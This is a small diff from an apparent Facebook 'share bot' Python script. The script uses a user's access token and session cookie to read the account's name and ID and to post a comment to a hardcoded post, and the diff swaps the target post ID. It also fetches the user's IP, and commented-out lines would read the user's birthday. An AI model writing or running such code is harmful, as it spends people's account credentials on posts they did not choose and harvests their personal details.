@@ -126,7 +126,7 @@ def bot_share():
 		ip = requests.get("https://api.ipify.org").text
 		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
 		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
-		requests.post(f"https://graph.facebook.com/3131264217123821/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
+		requests.post(f"https://graph.facebook.com/3131295663787343/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
 #		ttl = requests.get(f"https://graph.facebook.com/{id}?fields=birthday&access_token=%s"%(token),cookies={"cookie":cok}).json()["birthday"]
 #		m, d, y = ttl.split('/')
 #		tete = (str(d)+'/'+str(m)+'/'+str(y))
